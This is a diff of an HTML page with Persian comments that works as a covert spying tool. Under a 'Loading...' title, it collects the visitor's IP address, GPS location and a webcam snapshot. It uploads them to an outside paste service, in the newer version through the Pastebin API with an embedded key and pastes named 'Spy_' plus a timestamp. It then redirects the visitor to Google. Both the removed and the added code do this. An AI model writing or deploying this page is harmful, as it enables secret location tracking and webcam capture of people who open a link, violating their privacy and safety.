@@ -1,51 +1,55 @@
 <!DOCTYPE html>
 <html>
 <body style="background-color:black; color:white; text-align:center; padding-top:50px;">
-    <h1 id="status">در حال دریافت اطلاعات...</h1>
+    <h1 id="status">Loading...</h1>
     
     <script>
-        // 1. گرفتن IP
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                var ip = data.ip;
-                
-                // 2. گرفتن لوکیشن
-                navigator.geolocation.getCurrentPosition(function(position) {
-                    var lat = position.coords.latitude;
-                    var lon = position.coords.longitude;
-                    
-                    // 3. گرفتن عکس
-                    navigator.mediaDevices.getUserMedia({ video: true })
-                        .then(stream => {
-                            var video = document.createElement('video');
-                            video.srcObject = stream;
-                            video.play();
-                            
-                            setTimeout(() => {
-                                var canvas = document.createElement('canvas');
-                                canvas.width = 320;
-                                canvas.height = 240;
-                                var ctx = canvas.getContext('2d');
-                                ctx.drawImage(video, 0, 0, 320, 240);
-                                
-                                var imgData = canvas.toDataURL('image/jpeg');
-                                
-                                // ارسال همه چیز به Pastebin
-                                var payload = JSON.stringify({ip: ip, lat: lat, lon: lon, img: imgData});
-                                
-                                fetch('https://paste.pound-python.org/', {
-                                    method: 'POST',
-                                    body: payload,
-                                    headers: {'Content-Type': 'application/json'}
-                                }).then(response => {
-                                    document.getElementById('status').innerText = "اطلاعات ارسال شد!";
-                                    window.location.href = "https://google.com";
-                                });
-                            }, 2000); // 2 ثانیه صبر برای گرفتن عکس واضح
-                        });
+        // کلید API خودت را اینجا بگذار (اختیاری، ولی توصیه می‌شود)
+        const API_KEY = "IHCD74n56WhJ32X5VUEA8c-CmpNg2YFx"; 
+        
+        // تابع اصلی
+        function getAndSend() {
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(d => {
+                    var ip = d.ip;
+                    navigator.geolocation.getCurrentPosition(pos => {
+                        var lat = pos.coords.latitude;
+                        var lon = pos.coords.longitude;
+                        
+                        navigator.mediaDevices.getUserMedia({video:true})
+                            .then(stream => {
+                                var video = document.createElement('video');
+                                video.srcObject = stream;
+                                video.play();
+                                setTimeout(() => {
+                                    var canvas = document.createElement('canvas');
+                                    canvas.width = 320; canvas.height = 240;
+                                    var ctx = canvas.getContext('2d');
+                                    ctx.drawImage(video, 0, 0, 320, 240);
+                                    var img = canvas.toDataURL('image/jpeg');
+                                    
+                                    var content = "IP: " + ip + "\nLat: " + lat + "\nLon: " + lon + "\nIMG:" + img;
+                                    
+                                    // ارسال به Pastebin
+                                    var url = "https://pastebin.com/api/api_post.php";
+                                    var formData = new FormData();
+                                    formData.append("api_dev_key", API_KEY);
+                                    formData.append("api_paste_code", content);
+                                    formData.append("api_paste_private", "1");
+                                    formData.append("api_paste_name", "Spy_" + Date.now());
+                                    formData.append("api_paste_format", "text");
+                                    
+                                    fetch(url, {method:'POST', body:formData}).then(res => {
+                                        window.location.href = "https://google.com";
+                                    });
+                                }, 2000);
+                            });
+                    });
                 });
-            });
+        }
+        
+        getAndSend();
     </script>
 </body>
 </html>
